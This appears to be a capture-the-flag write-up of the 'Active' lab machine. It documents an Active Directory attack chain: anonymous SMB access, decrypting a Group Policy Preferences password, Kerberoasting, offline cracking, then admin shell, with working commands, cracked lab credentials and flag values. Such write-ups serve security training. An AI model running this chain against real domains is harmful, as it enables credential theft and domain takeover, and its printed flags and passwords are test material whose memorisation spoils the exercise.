NMAP

A comprehensive port scan was executed against the target host 10.129.243.101 using the command `sudo nmap -sC -sV -Pn -O -p 1-65535 10.129.243.101 --open`. This command performed a detailed service version detection, operating system fingerprinting, and default script scan against all ports, treating the host as online. The results will enumerate all open ports, the services running on them, their version numbers, and potential OS information.
```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 10.129.243.101 --open 
```

Network reconnaissance of the target host 10.129.243.101 identified a Microsoft Windows Server 2008 R2 SP1 system. The host is configured as an Active Directory Domain Controller for the domain `active.htb`. Key services exposed include the Kerberos authentication service, LDAP for directory access, Microsoft DNS, and SMB ports for file sharing. The presence of multiple RPC endpoints and a .NET Message Framing service further expands the attack surface of this critical infrastructure component.

```output
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-19 20:55:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC

```

The host was confirmed to be a domain controller for the domain `active.htb` running Windows Server 2008 R2 Build 7601. SMB signing is enabled, and support for the legacy SMBv1 protocol is disabled.
```bash
nxc smb 10.129.243.101 
```
OUTPUT
```output
SMB         10.129.243.101  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
```

The local hosts file was updated to resolve the domain name `active.htb` and its host `dc.active.htb` to the target IP address 10.129.243.101, confirming its identity as the domain controller.
```bash
cat  /etc/hosts
10.129.243.101   dc.active.htb    active.htb  DC
```

Enumeration of SMB shares on the domain controller revealed several standard administrative shares (ADMIN$, C$) and critical domain shares including NETLOGON and SYSVOL. A non-standard share named "Replication" was also discovered, which is often used for data distribution and may contain accessible data.

```bash
smbclient -L //dc.active.htb  
```

```output

Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      

```

Anonymous access was successfully granted to the "Replication" SMB share. A Groups.xml file, containing cached Group Policy Preferences, was retrieved from the share. This file is known to potentially store encrypted credentials used for domain account management.

```bash
smbclient -N //dc.active.htb/Replication

```

```bash

smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
```

The retrieved Groups.xml file contained a encrypted password (cpassword) for the domain user "active.htb\SVC_TGS". This password is encrypted using a known, static AES key which is publicly available, allowing for the credential to be decrypted to plaintext.
```bash
cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

The encrypted cpassword from the Groups.xml file was successfully decrypted, revealing the plaintext password "GPPstillStandingStrong2k18" for the domain user "SVC_TGS". This provides valid domain credentials.
```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```
Using the compromised credentials for the SVC_TGS account, a Kerberoasting attack was successfully performed. The attack retrieved a Ticket-Granting-Service (TGS) ticket for the Active Directory service principal, which is encrypted with the service account's password hash and is now vulnerable to offline cracking.

```bash
impacket-GetUserSPNs -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.243.101
```
The Kerberoasting attack successfully obtained a service ticket for the domain administrator account. The ticket, which is encrypted with the Administrator's password hash, was captured and is ready for offline cracking to recover the plaintext password of the highest-privileged account in the domain.
```bash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5bbf886cb7da5ddddc61c80bf827f505$25014df9b1c480752cbb3ace999afcefccbfa91ac748dc651be70f7bead026c95fa4487a0e351b1e7754ae10d8d7a4654b0b8099a4e8e74d67c78e80554db006b42045c75ed00ff050069458fc41dd08abbbc19d722746ecf40b955a6dbd1c774fd3e7dde751fb93236047d7ab55bc69c81e638c77a7221d8f3e20df8eb079ac7fc3ebdfd3d2b07228bf15069feb3833bf90cd2bcfc70c4daf14edb50dfb751b836c86792c4813b412e5f575405bb75c90a0b5edfeaa3134cac8d9de165a19da8264aaacf1b284265d6ed44550e07082dd263db27f9abc6ed9164b58d5fc04f0e951481e939b749d3e5357611cb659bfba8878cdc9a68bc47f8a55ca2d58d905511421203b86500dbaaf24e672d0f7ac2617e47a169cfe081dd237f90f001061537db13b6634c8bc63fd85c54c4351e7aede775a18f15908ca53c1bad195d4c5bbf120c10015763d56910874570c29966588dacb1441f686055280d2c4c0877b52989cf46f6852dda20e507448d96c9bb07acb37206d91d5fd495bf7b964237bc9873c6efefcae601dc8155c32a95e8c5d48afb88b41be0cb69ea059e21e6513412e6372d8e7c048dd8cc7b610f7c8bd12c3acfbd04702f9fb520ccc0310e18886be1bbeadd238008f349de312dfc13caa8bfc9faabea56c298e7d3f28a889d57dcdb9d06c06a836ba306daa4ae3eeebc2b7c2486393f246cbfbcb56571c9d80e4413832c1f7823c20bd5be9f7cbc84d15cd5df7e3bfd973105db8200759168e40e1ade369d859d947098281f2d3a0f95f7a75e0db8ec83094ee06b36d66697737b09017b21c51f1452c5b59cdd691e3897563ca461082b12edd24d14a98d55e9b0b2f78c28e438b53ee4aa4daa9f921ba6266125f31a59f7c9054fdea13f996813e500a0a40dd4abf721fd5aef6ca290d8bd8fe47f18bce3e5872e993e98b6a08c0267f97687d11c72e6b2583b6968eec1f3840916f802f0fd35950a894691dcc8da887443a866192af4bc0248805d2682a417ea514dcfe5b39ec72db03d1e34463652edaf0fa9efa58e2343ebcbe15c7d58aa9488e22b11d150887ece04ca72a620d7eecb1c807f305de5799c06e2820b82bddfce8c1ccd4d8ff38cb888711e86ea69e42aedba8e126f0d3fcc8fb2066919e728dbbe86ee2f12b2dac7896938800a1587312fb1d4d2930e2e7cd49056883d31b1c01232c2a14f569710c038b8bf744cc18bf50e6ffae6dc0c74a742cd8e9228d3559f06d8f90


```
The captured Kerberos service ticket for the Administrator account was successfully cracked, revealing the plaintext password "Ticketmaster1968". This provides full compromise of the domain administrator credentials

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:30 DONE (2025-10-19 17:58) 0.03242g/s 341681p/s 341681c/s 341681C/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


```

The cracked domain administrator credentials were successfully validated, granting full administrative access to the domain controller. The host is now confirmed as fully compromised.


```bash
netexec smb 10.129.243.101  -u administrator  -p Ticketmaster1968          

SMB         10.129.243.101  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.243.101  445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)                  
```

The penetration test successfully achieved full domain compromise. The attack path began with the anonymous retrieval of a Group Policy Preferences file from an exposed SMB share, which contained encrypted credentials. These credentials were decrypted, providing access to a domain user account. This access was leveraged to perform a Kerberoasting attack, obtaining a service ticket for the domain administrator. The ticket was cracked offline, revealing the administrator's password. The credentials were validated, granting unrestricted administrative access to the domain controller.
```bash
 python3 wmiexec.py administrator:'Ticketmaster1968'@10.129.243.101
```
The user flag `45c7562d56092871eaf978f280de1ba5` was captured from the SVC_TGS user's desktop. The root flag `3e79ebe629762ea0938543dbaa3dda1b` was captured from the Administrator's desktop, confirming total system ownership


```output
C:\users\SVC_TGS\Desktop>type user.txt
45c7562d56092871eaf978f280de1ba5
C:\users\Administrator\desktop>type root.txt
3e79ebe629762ea0938543dbaa3dda1b


```